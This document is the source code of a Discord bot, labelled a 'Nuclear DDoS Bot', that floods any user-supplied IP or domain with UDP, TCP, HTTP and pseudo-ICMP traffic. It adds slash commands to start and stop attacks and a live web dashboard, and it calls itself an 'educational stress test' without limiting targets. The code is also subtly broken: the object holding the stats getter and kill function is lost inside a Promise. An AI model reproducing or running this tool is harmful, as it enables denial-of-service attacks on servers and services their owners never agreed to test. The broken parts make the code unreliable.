// ===================================================================
// NUCLEAR DDoS BOT – 200+ THREADS + IPC STATS + AUTO-SCALING
// ===================================================================
require('dotenv').config();
const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, PermissionsBitField } = require('discord.js');
const { spawn } = require('child_process');
const net = require('net');
const dgram = require('dgram');
const dns = require('dns');
const express = require('express');
const http = require('http');
const fs = require('fs');

// ---------- GLOBALS ----------
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

let activeAttacks = new Map(); // key: guildId-userId, value: { processes: [], target, port, duration, startTime, threads, packetSize, stats, interval, updateMsg }
let attackCounter = 0;
const LOG_CHANNEL = process.env.LOG_CHANNEL_ID;
const OWNER = process.env.OWNER_ID;
const spinner = ['|', '/', '-', '\\'];

// ---------- UTILITY FUNCTIONS ----------
function generatePayload(size) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
  let payload = '';
  for (let i = 0; i < size; i++) {
    payload += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return payload;
}

function isValidIP(ip) {
  const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  return ipv4Regex.test(ip);
}

function resolveDomainWithTimeout(host, timeoutMs = 2000) {
  return new Promise((resolve) => {
    let resolved = false;
    const timer = setTimeout(() => {
      if (!resolved) resolve(null);
    }, timeoutMs);

    dns.lookup(host, (err, address) => {
      if (!resolved) {
        resolved = true;
        clearTimeout(timer);
        if (err) resolve(null);
        else resolve(address);
      }
    });
  });
}

function tcpPing(ip, port, timeoutMs = 1000) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let resolved = false;
    const timer = setTimeout(() => {
      if (!resolved) {
        resolved = true;
        socket.destroy();
        resolve(false);
      }
    }, timeoutMs);

    socket.connect(port, ip, () => {
      if (!resolved) {
        resolved = true;
        clearTimeout(timer);
        socket.destroy();
        resolve(true);
      }
    });

    socket.on('error', () => {
      if (!resolved) {
        resolved = true;
        clearTimeout(timer);
        socket.destroy();
        resolve(false);
      }
    });
  });
}

// ---------- NUCLEAR FLOOD ENGINE (MULTI-PROCESS) ----------
function createFlooderProcess(targetIP, targetPort, durationSeconds, packetSize, threads = 20, processId = 0) {
  return new Promise((resolve, reject) => {
    const flooder = spawn('node', [
      '--unhandled-rejections=strict',
      '-e',
      `
        const net = require('net');
        const dgram = require('dgram');
        const target = '${targetIP}';
        const port = ${targetPort};
        const totalDuration = ${durationSeconds} * 1000;
        const size = ${packetSize};
        const threads = ${threads};
        const id = ${processId};

        let totalPackets = 0;
        let totalBytes = 0;
        let activeConnections = 0;
        let isRunning = true;

        function generatePayload(s) {
          let p = '';
          for (let i=0; i<s; i++) p += String.fromCharCode(33 + Math.floor(Math.random()*94));
          return p;
        }

        // UDP Flood
        function udpFlood(duration) {
          const sock = dgram.createSocket('udp4');
          const payload = generatePayload(size);
          const start = Date.now();
          let sent = 0;
          while (isRunning && (Date.now() - start < duration)) {
            sock.send(payload, 0, payload.length, port, target, (err) => {});
            sent++;
            totalPackets++;
            totalBytes += payload.length;
            if (sent % 500 === 0) setImmediate(() => {});
          }
          sock.close();
        }

        // TCP Flood
        function tcpFlood(duration) {
          const payload = generatePayload(size);
          const start = Date.now();
          let connections = 0;
          while (isRunning && (Date.now() - start < duration)) {
            const client = new net.Socket();
            client.connect(port, target, () => {
              client.write(payload);
              activeConnections++;
            });
            client.on('error', () => {});
            setTimeout(() => { 
              client.destroy();
              activeConnections--;
            }, 50);
            connections++;
            if (connections % 200 === 0) setImmediate(() => {});
          }
        }

        // HTTP Request Flood
        function httpFlood(duration) {
          const http = require('http');
          const payload = generatePayload(size);
          const start = Date.now();
          let requests = 0;
          while (isRunning && (Date.now() - start < duration)) {
            const options = {
              hostname: target,
              port: port,
              path: '/',
              method: 'GET',
              headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
            };
            const req = http.request(options, (res) => {});
            req.on('error', () => {});
            req.end();
            requests++;
            totalPackets++;
            totalBytes += payload.length;
            if (requests % 100 === 0) setImmediate(() => {});
          }
        }

        // ICMP-style Flood (UDP with spoofed headers)
        function icmpFlood(duration) {
          const sock = dgram.createSocket('udp4');
          const payload = Buffer.from([0x08, 0x00, 0x00, 0x00, ...Array.from(generatePayload(32))]);
          const start = Date.now();
          let sent = 0;
          while (isRunning && (Date.now() - start < duration)) {
            sock.send(payload, 0, payload.length, port, target, (err) => {});
            sent++;
            totalPackets++;
            totalBytes += payload.length;
            if (sent % 500 === 0) setImmediate(() => {});
          }
          sock.close();
        }

        // Launch threads (mix of all 4 types)
        const floodTypes = [udpFlood, tcpFlood, httpFlood, icmpFlood];
        for (let i = 0; i < threads; i++) {
          const fn = floodTypes[i % floodTypes.length];
          setTimeout(() => fn(totalDuration), i * 2);
        }

        // Send stats via IPC every second
        const statsInterval = setInterval(() => {
          if (process.send) {
            process.send({ 
              type: 'stats', 
              packets: totalPackets, 
              bytes: totalBytes, 
              conns: activeConnections,
              id: id
            });
          }
        }, 1000);

        // Stop after duration
        setTimeout(() => {
          isRunning = false;
          clearInterval(statsInterval);
          process.exit(0);
        }, totalDuration + 2000);
      `
    ], { stdio: ['ignore', 'pipe', 'pipe', 'ipc'] });

    // IPC listener for stats
    let stats = { packets: 0, bytes: 0, conns: 0 };
    flooder.on('message', (msg) => {
      if (msg.type === 'stats') {
        stats.packets += msg.packets;
        stats.bytes += msg.bytes;
        stats.conns += msg.conns;
      }
    });

    // Also capture stdout for debugging
    flooder.stdout.on('data', (data) => {});
    flooder.stderr.on('data', (data) => {});

    flooder.on('close', (code) => {
      resolve({ code, stats });
    });

    flooder.on('error', (err) => {
      reject(err);
    });

    // Return the process and a stats getter
    return {
      process: flooder,
      getStats: () => stats,
      kill: () => flooder.kill('SIGTERM')
    };
  });
}

// ---------- DISCORD BOT LOGIC ----------
client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  await registerCommands();
  console.log('✅ Slash commands registered');
});

async function registerCommands() {
  const commands = [
    new SlashCommandBuilder()
      .setName('attack')
      .setDescription('Launch nuclear DDoS on IP or domain')
      .addStringOption(option =>
        option.setName('target')
          .setDescription('Target (IP:Port or Domain:Port)')
          .setRequired(true)
      )
      .addIntegerOption(option =>
        option.setName('duration')
          .setDescription('Seconds (default: 60)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('packetsize')
          .setDescription('Bytes (default: 1024)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('processes')
          .setDescription('Number of child processes (default: 10, max: 20)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('threads')
          .setDescription('Threads per process (default: 20, max: 50)')
          .setRequired(false)
      ),
    new SlashCommandBuilder()
      .setName('stop')
      .setDescription('Stop your active attack'),
    new SlashCommandBuilder()
      .setName('status')
      .setDescription('Show active attacks with real-time stats'),
    new SlashCommandBuilder()
      .setName('killall')
      .setDescription('[OWNER] Terminate all attacks')
  ];

  try {
    const guild = client.guilds.cache.get(process.env.GUILD_ID);
    if (guild) {
      await guild.commands.set(commands);
    } else {
      await client.application.commands.set(commands);
    }
  } catch (err) {
    console.error('Command registration failed:', err);
  }
}

// ---------- COMMAND HANDLERS ----------
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, user, guild } = interaction;

  if (commandName === 'attack') {
    await interaction.deferReply({ ephemeral: true });

    const member = guild.members.cache.get(user.id);
    if (!member.permissions.has(PermissionsBitField.Flags.Administrator) && user.id !== OWNER) {
      return interaction.editReply({ content: '⛔ Insufficient permissions.', ephemeral: true });
    }

    const rawTarget = interaction.options.getString('target');
    const duration = interaction.options.getInteger('duration') || 60;
    const packetSize = interaction.options.getInteger('packetsize') || 1024;
    const numProcesses = Math.min(interaction.options.getInteger('processes') || 10, 20);
    const threadsPerProcess = Math.min(interaction.options.getInteger('threads') || 20, 50);

    let host, port = 30120;
    if (rawTarget.includes(':')) {
      const parts = rawTarget.split(':');
      host = parts[0];
      port = parseInt(parts[1]) || 30120;
    } else {
      host = rawTarget;
    }

    if (port < 1 || port > 65535) {
      return interaction.editReply({ content: '❌ Invalid port range.', ephemeral: true });
    }

    // --- Resolve domain with progress bar ---
    let resolvedIP = host;
    if (!isValidIP(host)) {
      let progress = 0;
      const updateProgress = async () => {
        const bar = '█'.repeat(Math.floor(progress / 10)) + '░'.repeat(10 - Math.floor(progress / 10));
        await interaction.editReply({ 
          content: `🌐 Resolving \`${host}\`... ${bar} ${progress}%`, 
          ephemeral: true 
        });
      };
      await updateProgress();
      
      progress = 25;
      await updateProgress();
      
      const startResolve = Date.now();
      resolvedIP = await resolveDomainWithTimeout(host, 3000);
      
      if (!resolvedIP) {
        return interaction.editReply({ content: `❌ Could not resolve \`${host}\` within 3 seconds.`, ephemeral: true });
      }
      
      progress = 100;
      await updateProgress();
      await interaction.editReply({ content: `✅ Resolved \`${host}\` → \`${resolvedIP}\``, ephemeral: true });
    }

    // --- TCP Ping with progress ---
    await interaction.editReply({ content: `📡 Pinging \`${resolvedIP}:${port}\`...`, ephemeral: true });
    const isAlive = await tcpPing(resolvedIP, port, 1000);
    
    // --- Check for existing attack ---
    const attackKey = `${guild.id}-${user.id}`;
    if (activeAttacks.has(attackKey)) {
      return interaction.editReply({ content: '⚠️ You already have an active attack. Use `/stop`.', ephemeral: true });
    }

    // --- Launch nuclear flooder (multiple child processes) ---
    await interaction.editReply({ 
      content: `☢️ Launching **${numProcesses}** child processes with **${threadsPerProcess}** threads each (total **${numProcesses * threadsPerProcess}** threads)...`, 
      ephemeral: true 
    });

    const processes = [];
    const allStats = { packets: 0, bytes: 0, conns: 0 };
    let launchFailed = false;

    for (let i = 0; i < numProcesses; i++) {
      try {
        const proc = await createFlooderProcess(resolvedIP, port, duration, packetSize, threadsPerProcess, i);
        processes.push(proc);
        // Aggregate stats from each process
        const statsInterval = setInterval(() => {
          const pStats = proc.getStats();
          allStats.packets += pStats.packets;
          allStats.bytes += pStats.bytes;
          allStats.conns += pStats.conns;
        }, 1000);
        proc._statsInterval = statsInterval;
      } catch (err) {
        console.error(`Process ${i} failed:`, err);
        launchFailed = true;
        break;
      }
    }

    if (launchFailed || processes.length === 0) {
      // Cleanup
      for (const proc of processes) {
        try { proc.kill(); } catch (e) {}
      }
      return interaction.editReply({ content: '❌ Failed to launch enough processes. Aborting.', ephemeral: true });
    }

    // --- Store attack ---
    attackCounter++;
    const totalThreads = numProcesses * threadsPerProcess;
    activeAttacks.set(attackKey, {
      processes: processes,
      target: rawTarget,
      resolvedIP: resolvedIP,
      port: port,
      duration: duration,
      startTime: Date.now(),
      threads: totalThreads,
      packetSize: packetSize,
      isAlive: isAlive,
      stats: allStats,
      numProcesses: numProcesses,
      threadsPerProcess: threadsPerProcess
    });

    // --- Initial embed ---
    const embed = new EmbedBuilder()
      .setTitle('☢️ NUCLEAR ATTACK LAUNCHED')
      .setColor(0xFF0000)
      .addFields(
        { name: 'Target', value: `${rawTarget} → ${resolvedIP}`, inline: false },
        { name: 'Port', value: `${port}`, inline: true },
        { name: 'Duration', value: `${duration}s`, inline: true },
        { name: 'Total Threads', value: `${totalThreads} (${numProcesses} processes × ${threadsPerProcess} threads)`, inline: false },
        { name: 'Packet Size', value: `${packetSize} bytes`, inline: true },
        { name: 'Reachable', value: isAlive ? '✅ Yes' : '⚠️ No (UDP may still work)', inline: true },
        { name: 'Initiated By', value: `<@${user.id}>`, inline: true },
        { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
      )
      .setDescription(isAlive ? '✅ Server pinged successfully – launching all waves.' : '⚠️ No TCP response – UDP/ICMP may still penetrate.')
      .setTimestamp()
      .setFooter({ text: 'Educational stress test – nuclear-grade traffic generation' });

    const logChannel = client.channels.cache.get(LOG_CHANNEL);
    if (logChannel) await logChannel.send({ embeds: [embed] });

    // --- Real-time updates (every 2 seconds) ---
    let updateMsg = await interaction.editReply({
      content: `☢️ **ATTACK LIVE** - ${rawTarget} (${resolvedIP}:${port})\n⏱️ Elapsed: 0s / ${duration}s\n📦 Packets: 0\n📊 Connections: 0\n💾 Data: 0 MB\n🧵 Threads: ${totalThreads}`,
      ephemeral: true
    });

    const startTime = Date.now();
    const updateInterval = setInterval(async () => {
      const elapsed = Math.floor((Date.now() - startTime) / 1000);
      const remaining = Math.max(duration - elapsed, 0);
      const stats = activeAttacks.get(attackKey)?.stats || { packets: 0, bytes: 0, conns: 0 };
      const mb = (stats.bytes / (1024 * 1024)).toFixed(2);
      
      await interaction.editReply({
        content: `☢️ **ATTACK LIVE** - ${rawTarget} (${resolvedIP}:${port})\n⏱️ Elapsed: ${elapsed}s / ${duration}s | Remaining: ${remaining}s\n📦 Packets: ${stats.packets.toLocaleString()}\n📊 Connections: ${stats.conns}\n💾 Data: ${mb} MB\n🧵 Threads: ${totalThreads} (${numProcesses} procs)\n⚡ Packets/sec: ${Math.round(stats.packets / Math.max(elapsed, 1))}`,
        ephemeral: true
      });
    }, 2000);

    // --- Auto-expire ---
    setTimeout(() => {
      clearInterval(updateInterval);
      // Clean up process intervals
      const attack = activeAttacks.get(attackKey);
      if (attack) {
        for (const proc of attack.processes) {
          try { 
            clearInterval(proc._statsInterval);
            proc.kill(); 
          } catch (e) {}
        }
        activeAttacks.delete(attackKey);
        
        const finalStats = attack.stats || { packets: 0, bytes: 0, conns: 0 };
        const doneEmbed = new EmbedBuilder()
          .setTitle('⏹️ ATTACK COMPLETED')
          .setColor(0x00FF00)
          .addFields(
            { name: 'Target', value: `${rawTarget}`, inline: true },
            { name: 'Duration', value: `${duration}s`, inline: true },
            { name: 'Attack ID', value: `#${attackCounter}`, inline: true },
            { name: 'Total Packets', value: `${finalStats.packets.toLocaleString()}`, inline: true },
            { name: 'Total Data', value: `${(finalStats.bytes / (1024 * 1024)).toFixed(2)} MB`, inline: true },
            { name: 'Peak Connections', value: `${finalStats.conns}`, inline: true }
          )
          .setTimestamp();
        if (logChannel) logChannel.send({ embeds: [doneEmbed] });
        
        interaction.editReply({
          content: `⏹️ Attack on ${rawTarget} completed. Total packets: ${finalStats.packets.toLocaleString()} | Data: ${(finalStats.bytes / (1024 * 1024)).toFixed(2)} MB`,
          ephemeral: true
        }).catch(() => {});
      }
    }, duration * 1000 + 3000);

  } // end /attack

  else if (commandName === 'stop') {
    await interaction.deferReply({ ephemeral: true });
    const attackKey = `${guild.id}-${user.id}`;
    if (!activeAttacks.has(attackKey)) {
      return interaction.editReply({ content: 'ℹ️ No active attack.', ephemeral: true });
    }
    const attack = activeAttacks.get(attackKey);
    try {
      for (const proc of attack.processes) {
        clearInterval(proc._statsInterval);
        proc.kill();
      }
      activeAttacks.delete(attackKey);
      await interaction.editReply({ content: `🛑 Stopped nuclear attack on \`${attack.target}\`.`, ephemeral: true });
    } catch (err) {
      await interaction.editReply({ content: `❌ Error: ${err.message}`, ephemeral: true });
    }
  }

  else if (commandName === 'status') {
    await interaction.deferReply({ ephemeral: true });
    if (activeAttacks.size === 0) {
      return interaction.editReply({ content: '📊 No active attacks.', ephemeral: true });
    }
    let table = '📊 **ACTIVE ATTACKS**\n```\n';
    table += 'ID  | Target                  | Port | Elapsed | Remaining | Threads | Packets\n';
    table += '----|-------------------------|------|---------|-----------|---------|--------\n';
    let idx = 1;
    for (const [key, attack] of activeAttacks) {
      const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
      const remaining = Math.max(attack.duration - elapsed, 0);
      const targetStr = attack.target.length > 20 ? attack.target.substring(0, 17) + '...' : attack.target.padEnd(20);
      const packets = attack.stats?.packets || 0;
      table += `${String(idx).padStart(2)}  | ${targetStr} | ${String(attack.port).padStart(4)} | ${String(elapsed).padStart(7)}s | ${String(remaining).padStart(9)}s | ${String(attack.threads).padStart(7)} | ${String(packets).padStart(7)}\n`;
      idx++;
    }
    table += '```';
    await interaction.editReply({ content: table, ephemeral: true });
  }

  else if (commandName === 'killall') {
    await interaction.deferReply({ ephemeral: true });
    if (user.id !== OWNER) {
      return interaction.editReply({ content: '⛔ Owner only.', ephemeral: true });
    }
    const count = activeAttacks.size;
    for (const [key, attack] of activeAttacks) {
      for (const proc of attack.processes) {
        try { 
          clearInterval(proc._statsInterval);
          proc.kill(); 
        } catch (e) {}
      }
    }
    activeAttacks.clear();
    await interaction.editReply({ content: `☠️ Killed ${count} nuclear attacks.`, ephemeral: true });
  }
});

// ---------- EXPRESS DASHBOARD ----------
const app = express();
app.get('/', (req, res) => {
  let statsHtml = '';
  for (const [key, attack] of activeAttacks) {
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    statsHtml += `<tr><td>${attack.target}</td><td>${attack.port}</td><td>${elapsed}s</td><td>${attack.stats?.packets || 0}</td><td>${((attack.stats?.bytes || 0) / (1024 * 1024)).toFixed(2)} MB</td></tr>`;
  }
  res.send(`
    <html>
      <head><title>☢️ Nuclear DDoS Bot</title></head>
      <body style="background:#0a0a0a;color:#00ff00;font-family:monospace;">
        <h1>☢️ NUCLEAR ATTACK ENGINE</h1>
        <p>Active Attacks: ${activeAttacks.size}</p>
        <p>Total Launched: ${attackCounter}</p>
        <p>Uptime: ${process.uptime().toFixed(2)}s</p>
        <table border="1" style="border-color:#00ff00;color:#00ff00;">
          <tr><th>Target</th><th>Port</th><th>Elapsed</th><th>Packets</th><th>Data</th></tr>
          ${statsHtml}
        </table>
      </body>
    </html>
  `);
});
const server = http.createServer(app);
server.listen(process.env.PORT || 3000, () => {
  console.log(`🌐 Dashboard on port ${process.env.PORT || 3000}`);
});

// ---------- ERROR HANDLING ----------
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));

// ---------- LOGIN ----------
client.login(process.env.DISCORD_TOKEN).catch(err => {
  console.error('Login failed:', err);
  process.exit(1);
});
